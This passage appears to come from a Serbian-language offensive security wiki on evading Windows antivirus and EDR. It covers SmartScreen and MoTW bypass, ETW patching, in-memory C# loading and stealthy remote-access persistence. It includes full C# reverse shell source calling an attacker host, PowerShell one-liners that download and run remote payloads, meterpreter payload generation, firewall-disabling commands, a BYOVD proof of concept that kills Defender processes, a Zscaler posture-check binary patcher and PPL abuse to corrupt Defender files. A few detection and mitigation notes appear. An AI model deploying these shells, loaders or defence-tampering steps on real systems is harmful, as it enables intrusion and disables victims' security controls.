- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) compilation suite-a koji može da pruži veću softversku bezbednost kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštitu od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako da se jezik `C++11/14` koristi za generisanje obfuskovanog koda u toku kompajliranja, bez korišćenja eksternih alata i bez menjanja kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija generisanih pomoću C++ template metaprogramming framework-a, što osobi koja želi da crack-uje aplikaciju dodatno otežava posao.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuskuje različite PE fajlove, uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne executable fajlove.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za jezike koje podržava LLVM, a koristi ROP (return-oriented programming). ROPfuscator obfuskuje program na nivou assembly koda tako što regularne instrukcije pretvara u ROP chains, čime onemogućava naše uobičajeno shvatanje normalnog toka izvršavanja.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u jeziku Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeći EXE/DLL u shellcode i zatim da ga učita

## SmartScreen i MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih executable fajlova sa interneta i njihovog izvršavanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom radi na pristupu zasnovanom na reputaciji, što znači da će aplikacije koje se retko preuzimaju aktivirati SmartScreen, čime će krajnji korisnik biti upozoren i sprečen da izvrši fajl (iako fajl i dalje može da se izvrši klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa nazivom Zone.Identifier, koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kog je fajl preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da executable fajlovi potpisani **pouzdanim** signing certificate-om **neće aktivirati SmartScreen**.

Veoma efikasan način da sprečite da vaši payload-i dobiju Mark of The Web jeste da ih upakujete u neku vrstu container-a, kao što je ISO. To se dešava zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na volume-e koji **nisu NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u output container-e kako bi zaobišao Mark-of-the-Web.

Primer upotrebe:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-a unutar ISO datoteka pomoću alata [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **loguju događaje**. Međutim, security proizvodi ga takođe mogu koristiti za nadgledanje i otkrivanje malicious aktivnosti.

Slično načinu na koji se AMSI onemogućava (zaobilazi), moguće je učiniti da funkcija **`EtwEventWrite`** user space procesa odmah vrati rezultat bez logovanja bilo kakvih događaja. To se postiže patch-ovanjem funkcije u memoriji tako da odmah vrati rezultat, čime se efektivno onemogućava ETW logging za taj proces.

Više informacija možete pronaći na adresama **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju poznato je već prilično dugo i još uvek predstavlja veoma dobar način za pokretanje post-exploitation alata bez detektovanja od strane AV-a.

Pošto će payload biti učitan direktno u memoriju bez dodirivanja diska, moraćemo da brinemo samo o patch-ovanju AMSI-ja za ceo proces.

Većina C2 framework-a (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već pruža mogućnost direktnog izvršavanja C# assembly-ja iz memorije, ali postoje različiti načini za to:

- **Fork\&Run**

Ovo podrazumeva **pokretanje novog sacrificial procesa**, inject-ovanje vašeg malicious post-exploitation koda u taj novi proces, izvršavanje malicious koda i njegovo ukidanje po završetku. Ovaj pristup ima i prednosti i nedostatke. Prednost fork and run metode jeste to što se izvršavanje odvija **izvan** našeg Beacon implant procesa. To znači da, ako nešto pođe po zlu ili bude detektovano tokom naše post-exploitation aktivnosti, postoji **mnogo veća verovatnoća** da će naš **implant preživeti.** Nedostatak je što postoji **veća verovatnoća da ćete biti detektovani pomoću Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ovo podrazumeva inject-ovanje malicious post-exploitation koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali je nedostatak to što, ako nešto pođe po zlu tokom izvršavanja vašeg payload-a, postoji **mnogo veća verovatnoća** da ćete **izgubiti svoj beacon**, jer može doći do njegovog rušenja.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o učitavanju C# Assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assembly-je možete učitavati i **iz PowerShell-a**. Pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video kompanije S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Korišćenje drugih programskih jezika

Kao što je predloženo u projektu [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati malicious kod pomoću drugih jezika tako što se kompromitovanoj mašini omogući pristup **interpreter okruženju instaliranom na Attacker Controlled SMB share-u**.

Omogućavanjem pristupa Interpreter Binaries datotekama i okruženju na SMB share-u možete **izvršavati proizvoljan kod u tim jezicima unutar memorije** kompromitovane mašine.

Repozitorijum navodi: Defender i dalje skenira skripte, ali korišćenjem jezika Go, Java, PHP itd. dobijamo **veću fleksibilnost za zaobilaženje statičkih signature-a**. Testiranje nasumičnih, ne-obfuskovanih reverse shell skripti u ovim jezicima pokazalo se uspešnim.

## TokenStomping

Token stomping manipuliše access token-om security proizvoda, kao što su EDR ili AV. Smanjivanje privilegija token-a može ostaviti proces aktivnim, a istovremeno ga sprečiti da obavlja privilegovane radnje inspekcije ili remediation-a.

Da bi se ovo sprečilo, Windows bi mogao da **spreči eksterne procese** da dobiju handles nad token-ima security procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje Trusted Software-a

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je deploy-ovati Chrome Remote Desktop na računar žrtve, a zatim ga koristiti za takeover i održavanje persistence-a:<sup>[[35]](#references)</sup>
1. Preuzmite ga sa adrese https://remotedesktop.google.com/, kliknite na „Set up via SSH“, a zatim kliknite na MSI datoteku za Windows kako biste je preuzeli.
2. Tiho pokrenite installer na računaru žrtve (potrebne su administratorske privilegije): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop-a i kliknite na „Next“. Wizard će zatim zatražiti autorizaciju; kliknite na dugme „Authorize“ da biste nastavili.
4. Izvršite dostavljenu komandu uz potrebne izmene: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametar `--pin` postavlja PIN bez korišćenja GUI-ja).


## Napredna evazija

Evazija je veoma složena tema. Ponekad morate uzeti u obzir veliki broj različitih izvora telemetrije u okviru samo jednog sistema, tako da je u zrelim okruženjima praktično nemoguće ostati potpuno nedetektovan.

Svako okruženje protiv kog radite imaće sopstvene prednosti i slabosti.

Toplo vam preporučujem da pogledate ovo predavanje autora [@ATTL4S](https://twitter.com/DaniLJ94), kako biste stekli osnovno razumevanje naprednijih tehnika evazije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je još jedno odlično predavanje autora [@mariuszbit](https://twitter.com/mariuszbit) o temi Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare tehnike**

### **Provera koje delove Defender pronalazi malicious**

Možete koristiti alat [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binarne datoteke** sve dok **ne utvrdi koji deo Defender** prepoznaje kao malicious, a zatim ga izdvojiti.\
Drugi alat koji radi **istu stvar jeste** [**avred**](https://github.com/dobin/avred), uz javno dostupan web servis na adresi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, sve verzije Windows-a dolazile su sa **Telnet serverom** koji ste mogli da instalirate (kao administrator) pomoću:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Podesi da se **pokrene** pri pokretanju sistema i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (stealth) i onemogući zaštitni zid:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam bin preuzimanja, ne setup)

**NA HOSTU**: Izvršite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binarni fajl _**winvnc.exe**_ i **novokreirani** fajl _**UltraVNC.ini**_ unutar **žrtve**

#### **Reverse connection**

**Napadač** treba da **izvrši unutar** svog **hosta** binarni fajl `vncviewer.exe -listen 5900`, kako bi bio **spreman** da prihvati obrnutu **VNC konekciju**. Zatim, unutar **žrtve**: Pokrenite winvnc daemon `winvnc.exe -run` i izvršite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste održali stealth, ne smete raditi nekoliko stvari

- Nemojte pokretati `winvnc` ako je već pokrenut, jer ćete aktivirati [popup](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez fajla `UltraVNC.ini` u istom direktorijumu, jer će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` za pomoć, jer ćete aktivirati [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT-a:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni defender će veoma brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# korišćenjem kompajlera
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje python-a za primer izrade injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Drugi alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Gašenje AV/EDR-a iz kernel prostora

Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** za onemogućavanje endpoint zaštite pre isporuke ransomware-a. Alat donosi sopstveni **ranjivi, ali *potpisani* driver** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu da blokiraju.<sup>[[12]](#references)</sup>

Ključne stavke
1. **Potpisani driver**: Fajl isporučen na disk je `ServiceMouse.sys`, ali je binarni fajl zapravo legitimno potpisani driver `AToolsKrnl64.sys` kompanije Antiy Labs, iz njihovog “System In-Depth Analysis Toolkit”. Pošto driver ima važeći Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje driver kao **kernel servis**, a druga ga pokreće, tako da `\\.\ServiceMouse` postaje dostupan iz user land-a.
3. **IOCTL-ovi koje driver izlaže**
| IOCTL kod | Sposobnost                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminira proizvoljan proces prema PID-u (koristi se za gašenje Defender/EDR servisa) |
| `0x990000D0` | Briše proizvoljan fajl sa diska |
| `0x990001D0` | Unload-uje driver i uklanja servis |

Minimalni C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi user-mode zaštite; kod koji se izvršava u kernelu može da otvara *zaštićene* procese, da ih terminira ili menja kernel objekte, bez obzira na PPL/PP, ELAM ili druge hardening funkcije.

Detekcija / Mitigacija
•  Omogućite Microsoftovu block listu za ranjive drivere (`HVCI`, `Smart App Control`) kako bi Windows odbio da učita `AToolsKrnl64.sys`.
•  Nadgledajte kreiranje novih *kernel* servisa i generišite upozorenje kada se driver učita iz direktorijuma sa pravima upisa za sve korisnike ili kada nije prisutan na allow-listi.
•  Pratite user-mode handle-ove ka prilagođenim device objektima, nakon čega slede sumnjivi `DeviceIoControl` pozivi.

### Zaobilaženje Zscaler Client Connector Posture provera patch-ovanjem binarnih fajlova na disku

Zscaler **Client Connector** lokalno primenjuje device-posture pravila i oslanja se na Windows RPC za komunikaciju rezultata sa drugim komponentama. Dva slaba dizajnerska rešenja omogućavaju potpuno zaobilaženje:

1. Evaluacija posture-a se odvija **u potpunosti na klijentskoj strani** (serveru se šalje boolean vrednost).
2. Interni RPC endpoint-i proveravaju samo da li je izvršni fajl koji se povezuje **potpisan od strane Zscaler-a** (putem `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Patch-ovanjem četiri potpisana binarna fajla na disku** oba mehanizma mogu biti neutralisana:

| Binarni fajl | Originalna logika koja se patch-uje | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa svaka provera prolazi |
| `ZSAService.exe` | Indirektni poziv ka `WinVerifyTrust` | NOP-ovan ⇒ bilo koji, čak i nepotpisan, proces može da se poveže na RPC pipe-ove |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity provere tunela | Zaobiđene |

Minimalni isečak patcher-a:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih datoteka i ponovnog pokretanja service stack-a:

* **Sve** posture provere prikazuju **green/compliant**.
* Unsigned ili izmenjeni binarni fajlovi mogu da otvore named-pipe RPC endpoints (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler policies.

Ova studija slučaja pokazuje kako se odluke o poverenju donete isključivo na strani client-a i jednostavne provere potpisa mogu zaobići sa nekoliko byte patch-eva.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) primenjuje hijerarhiju signer/level tako da samo protected procesi jednakog ili višeg nivoa mogu da menjaju druge protected procese. Ofanzivno, ako možete legitimno da pokrenete PPL-enabled binary i kontrolišete njegove argumente, možete benignu funkcionalnost (npr. logging) pretvoriti u ograničeni, PPL-backed write primitive protiv protected direktorijuma koje koriste AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Šta omogućava da proces radi kao PPL
- Target EXE (i svi učitani DLL-ovi) moraju biti potpisani PPL-capable EKU-om.
- Proces mora biti kreiran pomoću CreateProcess uz flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zatražiti kompatibilan protection level koji odgovara signer-u binary-ja (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za anti-malware signers, `PROTECTION_LEVEL_WINDOWS` za Windows signers). Pogrešni nivoi će dovesti do neuspešnog kreiranja.

Pogledajte i širi uvod u PP/PPL i LSASS protection ovde:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Alati za pokretanje
- Open-source helper: CreateProcessAsPPL (bira protection level i prosleđuje arguments target EXE-u):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Obrazac korišćenja:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitiv: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` samostalno pokreće novi proces i prihvata parametar za upisivanje log fajla na putanju koju navede pozivalac.
- Kada se pokrene kao PPL proces, upisivanje fajla se izvršava uz PPL podršku.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristite 8.3 short paths za upućivanje na uobičajeno zaštićene lokacije.

8.3 short path pomoćni alati
- Izlistajte short names: `dir /x` u svakom nadređenom direktorijumu.
- Izvedite short path u cmd-u: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktno)
1) Pokrenite PPL-capable LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći launcher (npr. CreateProcessAsPPL).
2) Prosledite ClipUp argument za putanju log fajla kako biste prinudili kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristite 8.3 short names.
3) Ako je ciljnom binarnom fajlu normalno onemogućen pristup ili je zaključan od strane AV-a tokom rada (npr. MsMpEng.exe), zakažite upis pri boot-u, pre nego što se AV pokrene, instaliranjem auto-start servisa koji se pouzdano izvršava ranije. Potvrdite redosled pri boot-u pomoću Process Monitor-a (boot logging).
4) Nakon reboot-a, upis uz PPL podršku se izvršava pre nego što AV zaključa svoje binarne fajlove, čime se ciljni fajl oštećuje i sprečava pokretanje.

Primer invocation-a (putanje su uklonjene/skraćene radi bezbednosti):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Napomene i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje, već samo njegovo odredište; primitive je pogodnije za korupciju nego za precizno ubacivanje sadržaja.
- Zahteva lokalni admin/SYSTEM za instaliranje/pokretanje servisa i period predviđen za reboot.
- Tajming je kritičan: ciljna datoteka ne sme biti otvorena; izvršavanje tokom boot-a izbegava zaključavanja datoteka.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito kada je njegov parent nestandardni launcher, u periodu oko boot-a.
- Novi servisi konfigurisani za auto-start sumnjivih binarnih datoteka koji se dosledno pokreću pre Defender/AV servisa. Istražite kreiranje/izmenu servisa pre neuspešnog pokretanja Defender-a.
- Nadgledanje integriteta datoteka Defender binarnih datoteka/Platform direktorijuma; neočekivano kreiranje/izmena datoteka od strane procesa sa protected-process flagovima.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane binarnih datoteka koje nisu AV.

Mitigacije
- WDAC/Code Integrity: ograničite koje potpisane binarne datoteke mogu da se pokreću kao PPL i pod kojim parent procesima; blokirajte pozivanje ClipUp-a izvan legitimnih konteksta.
- Service hygiene: ograničite kreiranje/izmenu auto-start servisa i nadgledajte manipulisanje redosledom pokretanja.
- Uverite se da su Defender tamper protection i early-launch protections omogućeni; istražite greške pri pokretanju koje ukazuju na korupciju binarne datoteke.
- Razmotrite onemogućavanje generisanja 8.3 short-name naziva na volumenima koji hostuju security tooling, ako je to kompatibilno sa vašim okruženjem (temeljno testirajte).

## Tampering Microsoft Defender putem hijackovanja Symlink-a foldera Platform Version

Windows Defender bira platformu iz koje se pokreće enumerisanjem podfoldera unutar:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira podfolder sa leksikografski najvišim stringom verzije (npr. `4.18.25070.5-0`), a zatim odatle pokreće procese Defender servisa (uz ažuriranje putanja servisa/registry-ja). Ovaj izbor veruje unosima direktorijuma, uključujući directory reparse points (symlinks). Administrator može ovo iskoristiti za preusmeravanje Defender-a na putanju u koju attacker može da upisuje i postići DLL sideloading ili ometanje servisa.<sup>[[21]](#references)[[22]](#references)</sup>

